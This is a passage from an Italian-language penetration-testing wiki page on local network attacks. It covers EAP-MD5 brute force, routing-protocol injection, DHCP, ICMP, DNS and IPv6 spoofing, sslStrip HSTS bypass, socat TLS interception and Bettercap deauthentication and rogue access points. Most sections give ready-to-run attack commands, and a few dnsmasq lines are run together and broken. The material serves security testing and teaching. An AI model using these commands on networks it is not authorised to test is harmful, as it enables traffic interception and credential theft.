- Forzare l'autenticazione EAP-MD5 per bypassare la convalida del certificato TLS
- Iniettare traffico di rete malevolo durante l'autenticazione utilizzando un hub o simile

Se l'attaccante si trova tra la vittima e il server di autenticazione, potrebbe cercare di degradare (se necessario) il protocollo di autenticazione a EAP-MD5 e catturare il tentativo di autenticazione. Poi, potrebbe eseguire un attacco di brute-force utilizzando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### Attacchi FHRP (GLBP & HSRP) <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) è una classe di protocolli di rete progettati per **creare un sistema di routing ridondante attivo**. Con FHRP, i router fisici possono essere combinati in un unico dispositivo logico, aumentando la tolleranza ai guasti e aiutando a distribuire il carico.

**Gli ingegneri di Cisco Systems hanno sviluppato due protocolli FHRP, GLBP e HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Esistono tre versioni del Routing Information Protocol (RIP): RIP, RIPv2 e RIPng. I datagrammi vengono inviati ai peer tramite la porta 520 utilizzando UDP da RIP e RIPv2, mentre i datagrammi vengono trasmessi alla porta UDP 521 tramite multicast IPv6 da RIPng. Il supporto per l'autenticazione MD5 è stato introdotto da RIPv2. D'altra parte, l'autenticazione nativa non è incorporata in RIPng; invece, ci si affida agli header IPsec AH e ESP opzionali all'interno di IPv6.

- **RIP e RIPv2:** La comunicazione avviene tramite datagrammi UDP sulla porta 520.
- **RIPng:** Utilizza la porta UDP 521 per trasmettere datagrammi tramite multicast IPv6.

Si noti che RIPv2 supporta l'autenticazione MD5 mentre RIPng non include l'autenticazione nativa, affidandosi agli header IPsec AH e ESP in IPv6.

### Attacchi EIGRP

**EIGRP (Enhanced Interior Gateway Routing Protocol)** è un protocollo di routing dinamico. **È un protocollo a vettore di distanza.** Se non c'è **autenticazione** e configurazione di interfacce passive, un **intruso** può interferire con il routing EIGRP e causare **avvelenamento delle tabelle di routing**. Inoltre, la rete EIGRP (in altre parole, il sistema autonomo) **è piatta e non ha segmentazione in zone**. Se un **attaccante inietta una rotta**, è probabile che questa rotta si **diffonda** in tutto il sistema EIGRP autonomo.

Attaccare un sistema EIGRP richiede **stabilire un vicinato con un router EIGRP legittimo**, il che apre molte possibilità, dalla ricognizione di base a varie iniezioni.

[**FRRouting**](https://frrouting.org/) consente di implementare **un router virtuale che supporta BGP, OSPF, EIGRP, RIP e altri protocolli.** Tutto ciò che devi fare è distribuirlo sul sistema dell'attaccante e puoi effettivamente fingere di essere un router legittimo nel dominio di routing.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) ha capacità per intercettare le trasmissioni EIGRP (Enhanced Interior Gateway Routing Protocol). Consente anche l'iniezione di pacchetti, che possono essere utilizzati per alterare le configurazioni di routing.

### OSPF

Nel protocollo Open Shortest Path First (OSPF) **l'autenticazione MD5 è comunemente impiegata per garantire comunicazioni sicure tra i router**. Tuttavia, questa misura di sicurezza può essere compromessa utilizzando strumenti come Loki e John the Ripper. Questi strumenti sono in grado di catturare e decifrare gli hash MD5, esponendo la chiave di autenticazione. Una volta ottenuta questa chiave, può essere utilizzata per introdurre nuove informazioni di routing. Per configurare i parametri della rotta e stabilire la chiave compromessa, vengono utilizzate rispettivamente le schede _Injection_ e _Connection_.

- **Cattura e decifratura degli hash MD5:** Strumenti come Loki e John the Ripper sono utilizzati a questo scopo.
- **Configurazione dei parametri della rotta:** Questo avviene tramite la scheda _Injection_.
- **Impostazione della chiave compromessa:** La chiave è configurata sotto la scheda _Connection_.

### Altri Strumenti e Risorse Generiche

- [**Above**](https://github.com/c4s73r/Above): Strumento per scansionare il traffico di rete e trovare vulnerabilità
- Puoi trovare alcune **ulteriori informazioni sugli attacchi di rete** [**qui**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

L'attaccante configura tutti i parametri di rete (GW, IP, DNS) del nuovo membro della rete inviando risposte DHCP false.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Controlla la [sezione precedente](#arp-spoofing).

### ICMPRedirect

ICMP Redirect consiste nell'inviare un pacchetto ICMP di tipo 1 codice 5 che indica che l'attaccante è il modo migliore per raggiungere un IP. Quindi, quando la vittima vuole contattare l'IP, invierà il pacchetto attraverso l'attaccante.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

L'attaccante risolverà alcuni (o tutti) i domini che la vittima richiede.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Configura il proprio DNS con dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Gateway locali

Spesso esistono più percorsi verso sistemi e reti. Dopo aver creato un elenco di indirizzi MAC all'interno della rete locale, utilizza _gateway-finder.py_ per identificare gli host che supportano l'inoltro IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, e mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Per la risoluzione degli host locali quando le ricerche DNS non hanno successo, i sistemi Microsoft si affidano a **Link-Local Multicast Name Resolution (LLMNR)** e al **NetBIOS Name Service (NBT-NS)**. Allo stesso modo, **Apple Bonjour** e le implementazioni **zero-configuration** di Linux utilizzano **Multicast DNS (mDNS)** per scoprire i sistemi all'interno di una rete. A causa della natura non autenticata di questi protocolli e del loro funzionamento su UDP, inviando messaggi in broadcast, possono essere sfruttati da attaccanti che mirano a reindirizzare gli utenti a servizi malevoli.

Puoi impersonare servizi che vengono cercati dagli host utilizzando Responder per inviare risposte false.\
Leggi qui ulteriori informazioni su [come impersonare servizi con Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

I browser utilizzano comunemente il **protocollo Web Proxy Auto-Discovery (WPAD) per acquisire automaticamente le impostazioni del proxy**. Questo comporta il recupero dei dettagli di configurazione da un server, specificamente attraverso un URL come "http://wpad.example.org/wpad.dat". La scoperta di questo server da parte dei client può avvenire attraverso vari meccanismi:

- Tramite **DHCP**, dove la scoperta è facilitata utilizzando un codice speciale 252.
- Tramite **DNS**, che comporta la ricerca di un nome host etichettato _wpad_ all'interno del dominio locale.
- Via **Microsoft LLMNR e NBT-NS**, che sono meccanismi di fallback utilizzati nei casi in cui le ricerche DNS non hanno successo.

Lo strumento Responder sfrutta questo protocollo agendo come un **server WPAD malevolo**. Utilizza DHCP, DNS, LLMNR e NBT-NS per ingannare i client facendoli connettere a esso. Per approfondire come i servizi possono essere impersonati utilizzando Responder [controlla questo](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP e dispositivi UPnP](spoofing-ssdp-and-upnp-devices.md)

Puoi offrire diversi servizi nella rete per cercare di **ingannare un utente** a inserire alcune **credenziali in chiaro**. **Ulteriori informazioni su questo attacco in** [**Spoofing SSDP e Dispositivi UPnP**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Questo attacco è molto simile all'ARP Spoofing ma nel mondo IPv6. Puoi far credere alla vittima che l'IPv6 del GW abbia il MAC dell'attaccante.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Alcuni sistemi operativi configurano per impostazione predefinita il gateway dai pacchetti RA inviati nella rete. Per dichiarare l'attaccante come router IPv6 puoi usare:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Per impostazione predefinita, alcuni sistemi operativi cercano di configurare il DNS leggendo un pacchetto DHCPv6 nella rete. Quindi, un attaccante potrebbe inviare un pacchetto DHCPv6 per configurarsi come DNS. Il DHCP fornisce anche un IPv6 alla vittima.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (pagina falsa e iniezione di codice JS)

## Attacchi Internet

### sslStrip

Fondamentalmente, ciò che fa questo attacco è che, nel caso in cui l'**utente** cerchi di **accedere** a una pagina **HTTP** che sta **reindirizzando** alla versione **HTTPS**. **sslStrip** manterrà una **connessione HTTP con** il **client e** una **connessione HTTPS con** il **server**, in modo da poter **sniffare** la connessione in **testo semplice**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ e dns2proxy per bypassare HSTS

La **differenza** tra **sslStrip+ e dns2proxy** rispetto a **sslStrip** è che essi **reindirizzeranno** per esempio _**www.facebook.com**_ **a** _**wwww.facebook.com**_ (nota l'**extra** "**w**") e imposteranno l'**indirizzo di questo dominio come l'IP dell'attaccante**. In questo modo, il **client** si **connetterà** a _**wwww.facebook.com**_ **(l'attaccante)** ma dietro le quinte **sslstrip+** **mantenere** la **vera connessione** tramite https con **www.facebook.com**.

L'**obiettivo** di questa tecnica è **evitare HSTS** perché _**wwww**.facebook.com_ **non sarà** salvato nella **cache** del browser, quindi il browser sarà ingannato a eseguire **l'autenticazione di facebook in HTTP**.\
Nota che per eseguire questo attacco la vittima deve inizialmente cercare di accedere a [http://www.faceook.com](http://www.faceook.com) e non a https. Questo può essere fatto modificando i link all'interno di una pagina http.

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) e [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip o sslStrip+ non funzionano più. Questo perché ci sono regole HSTS pre-salvate nei browser, quindi anche se è la prima volta che un utente accede a un dominio "importante", accederà tramite HTTPS. Inoltre, nota che le regole pre-salvate e altre regole generate possono utilizzare il flag** [**`includeSubdomains`**](https://hstspreload.appspot.com) **quindi l'esempio di** _**wwww.facebook.com**_ **di prima non funzionerà più poiché** _**facebook.com**_ **usa HSTS con `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP ascolta sulla porta
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ascolta sulla porta

#### Genera chiavi e certificato autofirmato
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ascolta utilizzando il certificato
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Ascolta utilizzando il certificato e reindirizza agli host
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
A volte, se il cliente verifica che il CA è valido, potresti **servire un certificato di un altro hostname firmato da un CA**.\
Un altro test interessante è servire un **certificato dell'hostname richiesto ma auto-firmato**.

Altre cose da testare sono provare a firmare il certificato con un certificato valido che non è un CA valido. Oppure utilizzare la chiave pubblica valida, forzare l'uso di un algoritmo come Diffie-Hellman (uno che non richiede di decrittare nulla con la vera chiave privata) e quando il cliente richiede una prova della vera chiave privata (come un hash) inviare una prova falsa e aspettarsi che il cliente non controlli questo.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Note di Scoperta Attiva

Tieni presente che quando un pacchetto UDP viene inviato a un dispositivo che non ha la porta richiesta, viene inviato un ICMP (Port Unreachable).

### **Scoperta ARP**

I pacchetti ARP vengono utilizzati per scoprire quali IP sono in uso all'interno della rete. Il PC deve inviare una richiesta per ogni possibile indirizzo IP e solo quelli in uso risponderanno.

### **mDNS (DNS multicast)**

Bettercap invia una richiesta MDNS (ogni X ms) chiedendo **\_services\_.dns-sd.\_udp.local**; la macchina che vede questo pacchetto di solito risponde a questa richiesta. Poi, cerca solo le macchine che rispondono a "services".

**Strumenti**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS (NetBios Name Server)**

Bettercap trasmette pacchetti alla porta 137/UDP chiedendo il nome "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap trasmette pacchetti SSDP cercando tutti i tipi di servizi (porta UDP 1900).

### **WSD (Web Service Discovery)**

Bettercap trasmette pacchetti WSD cercando servizi (porta UDP 3702).

## Riferimenti

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **Network Security Assessment: Know Your Network (3rd edition)**
- **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
